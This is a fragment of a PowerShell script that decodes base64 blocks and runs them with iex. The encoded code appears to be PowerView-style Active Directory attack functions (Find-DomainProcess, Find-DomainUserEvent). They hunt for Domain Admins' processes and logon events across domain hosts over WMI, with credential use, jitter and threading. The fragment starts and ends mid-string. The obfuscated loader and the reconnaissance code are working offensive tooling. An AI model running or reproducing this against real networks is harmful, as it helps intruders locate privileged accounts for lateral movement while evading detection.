ZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFVzZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdzYW1hY2NvdW50bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlcklkZW50aXR5J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRVc2VySWRlbnRpdHkgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckRvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFVzZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJMREFQRmlsdGVyJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJFVzZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRVc2VyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFkbWluQ291bnQnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydBZG1pbkNvdW50J10gPSAkVXNlckFkbWluQ291bnQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTmFtZSddKSB7CiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbRmluZC1Eb21haW5Qcm9jZXNzXSBRdWVyeWluZyBjb21wdXRlcnMgaW4gdGhlIGRvbWFpbicKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblByb2Nlc3NdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6ICQoJFRhcmdldENvbXB1dGVycy5MZW5ndGgpIgogICAgICAgIGlmICgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCAtZXEgMCkgewogICAgICAgICAgICB0aHJvdyAnW0ZpbmQtRG9tYWluUHJvY2Vzc10gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRlJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9jZXNzTmFtZSddKSB7CiAgICAgICAgICAgICRUYXJnZXRQcm9jZXNzTmFtZSA9IEAoKQogICAgICAgICAgICBGb3JFYWNoICgkVCBpbiAkUHJvY2Vzc05hbWUpIHsKICAgICAgICAgICAgICAgICRUYXJnZXRQcm9jZXNzTmFtZSArPSAkVC5TcGxpdCgnLCcpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRUYXJnZXRQcm9jZXNzTmFtZSAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHsKICAgICAgICAgICAgICAgICRUYXJnZXRQcm9jZXNzTmFtZSA9IFtTdHJpbmdbXV0gQCgkVGFyZ2V0UHJvY2Vzc05hbWUpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJJZGVudGl0eSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJMREFQRmlsdGVyJ10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlclNlYXJjaEJhc2UnXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyQWRtaW5Db3VudCddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJBbGxvd0RlbGVnYXRpb24nXSkgewogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtRG9tYWluVXNlciBAVXNlclNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgc2FtYWNjb3VudG5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRHcm91cFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICdJZGVudGl0eScgPSAkVXNlckdyb3VwSWRlbnRpdHkKICAgICAgICAgICAgICAgICdSZWN1cnNlJyA9ICRUcnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckRvbWFpbiddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRVc2VyRG9tYWluIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlclNlYXJjaEJhc2UnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFVzZXJTZWFyY2hCYXNlIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgJFRhcmdldFVzZXJzID0gR2V0LURvbWFpbkdyb3VwTWVtYmVyIEBHcm91cFNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgTWVtYmVyTmFtZQogICAgICAgIH0KICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgUGFyYW0oJENvbXB1dGVyTmFtZSwgJFByb2Nlc3NOYW1lLCAkVGFyZ2V0VXNlcnMsICRDcmVkZW50aWFsKQogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAgICAgJFVwID0gVGVzdC1Db25uZWN0aW9uIC1Db3VudCAxIC1RdWlldCAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcgogICAgICAgICAgICAgICAgaWYgKCRVcCkgewogICAgICAgICAgICAgICAgICAgIGlmICgkQ3JlZGVudGlhbCkgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2Vzc2VzID0gR2V0LVdNSVByb2Nlc3MgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9jZXNzZXMgPSBHZXQtV01JUHJvY2VzcyAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlciAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkUHJvY2VzcyBpbiAkUHJvY2Vzc2VzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUHJvY2Vzc05hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUHJvY2Vzc05hbWUgLUNvbnRhaW5zICRQcm9jZXNzLlByb2Nlc3NOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRUYXJnZXRVc2VycyAtQ29udGFpbnMgJFByb2Nlc3MuVXNlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblByb2Nlc3NdIFRvdGFsIG51bWJlciBvZiBob3N0czogJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluUHJvY2Vzc10gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVyIgogICAgICAgICAgICAkQ291bnRlciA9IDAKICAgICAgICAgICAgJFJhbmRObyA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJFRhcmdldENvbXB1dGVycykgewogICAgICAgICAgICAgICAgJENvdW50ZXIgPSAkQ291bnRlciArIDEKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRSYW5kTm8uTmV4dCgoMS0kSml0dGVyKSokRGVsYXksICgxKyRKaXR0ZXIpKiREZWxheSkKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblByb2Nlc3NdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkpIgogICAgICAgICAgICAgICAgJFJlc3VsdCA9IEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRUYXJnZXRDb21wdXRlciwgJFRhcmdldFByb2Nlc3NOYW1lLCAkVGFyZ2V0VXNlcnMsICRDcmVkZW50aWFsCiAgICAgICAgICAgICAgICAkUmVzdWx0CiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtYW5kICRTdG9wT25TdWNjZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluUHJvY2Vzc10gVGFyZ2V0IHVzZXIgZm91bmQsIHJldHVybmluZyBlYXJseSIKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluUHJvY2Vzc10gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHMiCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ1Byb2Nlc3NOYW1lJyA9ICRUYXJnZXRQcm9jZXNzTmFtZQogICAgICAgICAgICAgICAgJ1RhcmdldFVzZXJzJyA9ICRUYXJnZXRVc2VycwogICAgICAgICAgICAgICAgJ0NyZWRlbnRpYWwnID0gJENyZWRlbnRpYWwKICAgICAgICAgICAgfQogICAgICAgICAgICBOZXctVGhyZWFkZWRGdW5jdGlvbiAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcnMgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1TY3JpcHRQYXJhbWV0ZXJzICRTY3JpcHRQYXJhbXMgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Eb21haW5Vc2VyRXZlbnQgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZURlY2xhcmVkVmFyc01vcmVUaGFuQXNzaWdubWVudHMnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VQU0NyZWRlbnRpYWxUeXBlJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTQXZvaWRVc2luZ1BsYWluVGV4dEZvclBhc3N3b3JkJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2dvbkV2ZW50JyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkV4cGxpY2l0Q3JlZGVudGlhbExvZ29uJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdEb21haW4nKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdDb21wdXRlck5hbWUnLCBQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdkbnNob3N0bmFtZScsICdIb3N0TmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRG9tYWluJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRGaWx0ZXIsCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRTdGFydFRpbWUgPSBbRGF0ZVRpbWVdOjpOb3cuQWRkRGF5cygtMSksCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRFbmRUaW1lID0gW0RhdGVUaW1lXTo6Tm93LAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJE1heEV2ZW50cyA9IDUwMDAsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFVzZXJJZGVudGl0eSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJEb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdHcm91cE5hbWUnLCAnR3JvdXAnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFVzZXJHcm91cElkZW50aXR5ID0gJ0RvbWFpbiBBZG1pbnMnLAogICAgICAgIFtBbGlhcygnQWRtaW5Db3VudCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVzZXJBZG1pbkNvdW50LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENoZWNrQWNjZXNzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTdG9wT25TdWNjZXNzLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICREZWxheSA9IDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMC4wLCAxLjApXQogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAogICAgICAgIFtJbnRdCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwKV0KICAgICAgICAkVGhyZWFkcyA9IDIwCiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFVzZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdzYW1hY2NvdW50bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlcklkZW50aXR5J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRVc2VySWRlbnRpdHkgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJEb21haW4nXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRVc2VyRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyTERBUEZpbHRlciddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRVc2VyTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlclNlYXJjaEJhc2UnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkVXNlclNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJBZG1pbkNvdW50J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snQWRtaW5Db3VudCddID0gJFVzZXJBZG1pbkNvdW50IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VySWRlbnRpdHknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyTERBUEZpbHRlciddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJTZWFyY2hCYXNlJ10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFkbWluQ291bnQnXSkgewogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtRG9tYWluVXNlciBAVXNlclNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgc2FtYWNjb3VudG5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJHcm91cElkZW50aXR5J10gLW9yICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRmlsdGVyJ10pKSB7CiAgICAgICAgICAgICRHcm91cFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICdJZGVudGl0eScgPSAkVXNlckdyb3VwSWRlbnRpdHkKICAgICAgICAgICAgICAgICdSZWN1cnNlJyA9ICRUcnVlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVXNlckdyb3VwSWRlbnRpdHk6ICRVc2VyR3JvdXBJZGVudGl0eSIKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckRvbWFpbiddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRVc2VyRG9tYWluIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlclNlYXJjaEJhc2UnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFVzZXJTZWFyY2hCYXNlIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgJFRhcmdldFVz